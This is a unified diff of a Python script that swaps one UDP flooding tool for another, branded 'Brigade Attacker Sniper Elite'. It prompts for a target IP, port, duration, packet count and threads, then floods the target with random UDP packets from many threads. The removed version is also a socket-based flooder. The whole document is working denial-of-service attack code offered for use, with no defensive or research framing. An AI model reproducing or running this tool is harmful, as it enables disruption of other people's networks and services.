@@ -1,105 +1,90 @@
-# -*- coding: utf-8 -*-        
-import os
 import socket
-import string
-import random
 import threading
-from colorama import Fore, Back, Style
+import os
+import sys
+import time
+import random
 
-class SockFlood:
-	def __init__(self):
-		os.system("cls")
-		os.system("title PsyFlood - An Advance SERANGAN-UMUM ")
-		self.host=None
-		self.portnum=None
-		self.threads=None
+# Clear terminal screen
+os.system('clear')
 
-def graphics(self):
-    banner="""
+# Function to display banner
+def display_banner():
+    banner = """
+      ____  ___  ___   ___      ____      ___     __  __________       ___
+     | :: | :: | ::  | ::     / :::     | :::    :: | :::::::::      / :::
+     | :: ::   | ::  | ::    / :: ::    | :: ::  ::      /  ::      / :: ::
+     | :::     | ::::::::   / :: \ ::   | ::\ :: ::     / ::       / :: \ ::
+     | :: ::   | ::  | ::  / :::::::::  | :: \ ::::    / ::       / :::::::::
+     | :: | :: | ::  | :: / ::     | :: | ::  \ :::   | :::::::: / ::     \ ::
+     \__  \__  \___  \___ \___     \___ \___   \___   \_________ \___      \___
+    |———————————————————————————————————————————————————————————————————————————|
+       | B R I G A D E  A T T A C K E R  S N I P E R  E L I T E   ** By:Kun99 |
+    """
+    print(banner)
 
- :::::::::::|                                             / ::
- ———— ::————/    ___   ____    ____   ___   ____          | ::
-    | ;:\ ::    / ::|/:::::\  /:::::\ | ::: | ::          | ::
-    | :: \ :: :: :: / :: | ::/ :: | ::| :: :: ::  _____   | ::
-    | ::  \ ::  ::  | :::::/ | :::::/ | :: \ :::  |_::::| | :::::::
-     \__   \__/\__   \_____/  \_____/  |___  \___          \________
-||###################################################################||
-||_________[[ BEIGADE ATTACKER SNIPER ELITE  ** By:Kun99 ]]__________||
-||_________[[                                                        ||
-#####################################################################||
-"""
+# Prompt user for input
+def get_user_input():
+    print(" +======================================================+")
+    target_ip = input(" | Target IP : ").strip()
+    target_port = input(" | Target Port : ").strip()
+    attack_time = input(" | Time (seconds) : ").strip()
+    packet = input(" | Packet : ").strip()
+    thread_count = input(" | Thread : ").strip()
+    method = input(" | Method (UDP/TCP & UDP Mix) : ").strip().lower()
+    print(" ========================================================")
 
-print(Fore.RED+banner)
-		print(Fore.YELLOW+"""
-		[+] An Advance SERANGAN-UMUM Using Sockets Written in Python [+]"""+Fore.GREEN+"""
-		[+] Developer : Kanao#7218 [ """+Fore.WHITE+"""SecretsX ]"""
-		print(Fore.WHITE+"""
-		[+] Type `help` If You Are A Beginner [+]
-	 """)
+    return target_ip, int(target_port), int(attack_time), int(packet), int(thread_count), method
 
-	def start_attack(self,host,port=None):
-		self.sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
-		try:
-			url_path=str(string.ascii_letters + string.digits + string.punctuation)
-			byt = (f"GET /{url_path} HTTP/1.1\nHost: {host}\n\n").encode()
-			if not port:
-				self.sock.sendto(byt,(host,80))
-			elif port:
-				self.sock.sendto(byt,(host,int(port)))
-			print(Fore.WHITE+"""[+] Sent Byte Successfully""")
-		except Exception as e:
-			print(Fore.RED+f"""
-	[-] Socket ERROR! Fatal X_X
-	[-] EXCEPTION : {e}
-						""")
+# Display input summary after user provides inputs
+def display_input_summary(target_ip, target_port, attack_time, packet, thread_count, method):
+    display_banner()  # Show the banner again
+    print(" +======================================================+")
+    print(f" | Target IP : {target_ip:<40}|")
+    print(f" | Target Port : {target_port:<40}|")
+    print(f" | Time : {attack_time:<40}|")
+    print(f" | Packet : {packet:<45}|")
+    print(f" | Thread : {thread_count:<45}|")
+    print(f" | Method (UDP/TCP & UDP Mix) : {method:<25}|")
+    print(" ========================================================")
 
-	def command_parser(self,command):
-		if command=="help":
-			print(Fore.WHITE+"""
-	Welcome To PsyFlood Help Menu - 
+# UDP attack function
+def udp_attack(ip, port, packet, duration, thread_count):
+    timeout = time.time() + duration
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    data = random._urandom(1024)
 
-	(+) host %HOST% - Enter the Host Domain or Ip Address [!Required]
-	(+) port %PORT% - Enter a custom port if you have, or just don't use it will use port 80
-	(+) attacks %AMOUNT% - Enter a custom amount of attack, Default 1000
-	(+) start - Will start attacking and display outputs on console
-	""")
-		if "host " in command:
-			self.host=command.replace("host ","").replace("https://", "").replace("http://", "").replace("www.", "")
-			print(Fore.WHITE+f"""
-	[+] Successfully Set Host as {self.host}
-				""")
-		elif "port " in command:
-			self.portnum=command.replace("port ","")
-			print(Fore.WHITE+f"""
-	[+] Successfully Set Port to {self.portnum}
-				""")
-		elif command=="start":
-			print(self.portnum)
-			if self.host and self.portnum:
-				if int(self.threads):
-					for i in range(1,int(self.threads)):
-						threading.Thread(target=self.start_attack(self.host,self.portnum)).start()
-				else:
-					for i in range(1,1000):
-						threading.Thread(target=self.start_attack(self.host,self.portnum)).start()
-			elif self.host and not self.portnum:
-				if int(self.threads):
-					for i in range(1,int(self.threads)):
-						threading.Thread(target=self.start_attack(self.host)).start()
-				else:
-					for i in range(1,1000):
-						threading.Thread(target=self.start_attack(self.host)).start()
-		elif "attacks " in command:
-			self.threads=command.replace("attacks ","")
-			print(Fore.WHITE+f"""
-	[+] Successfully Set Threads to {self.threads}
-				""")
+    while time.time() < timeout:
+        try:
+            for _ in range(packet):
+                s.sendto(data, (ip, port))
+            print(f"[SNIPER_ELITE] Attacking... >  time {duration} target {ip}:{port} packet {packet} threads {thread_count}")
+        except socket.error:
+            s.close()
+            print("[SNIPER_ELITE] Error during attack, socket closed.")
+            break
 
-	def run(self):
-		self.graphics()
-		while True:
-			self.command_parser(input(Fore.CYAN+f"${os.environ.get('USERNAME')}$>> "))
+# Threaded attack function
+def start_attack(target_ip, target_port, packet, thread_count, method, duration):
+    if method == 'udp':
+        for _ in range(thread_count):
+            th = threading.Thread(target=udp_attack, args=(target_ip, target_port, packet, duration, thread_count))
+            th.start()
+    else:
+        print("[SNIPER_ELITE] Unsupported method. Only UDP supported in this version.")
 
-if __name__=="__main__":
-	app=SockFlood()
-	app.run()
+# Main program flow
+def main():
+    display_banner()  # Show the banner initially
+    target_ip, target_port, attack_time, packet, thread_count, method = get_user_input()
+    display_input_summary(target_ip, target_port, attack_time, packet, thread_count, method)
+
+    # Start attack
+    start_attack(target_ip, target_port, packet, thread_count, method, attack_time)
+
+if __name__ == '__main__':
+    try:
+        main()
+    except KeyboardInterrupt:
+        print("\n[SNIPER_ELITE] Attack interrupted. Exiting...")
+        sys.exit()
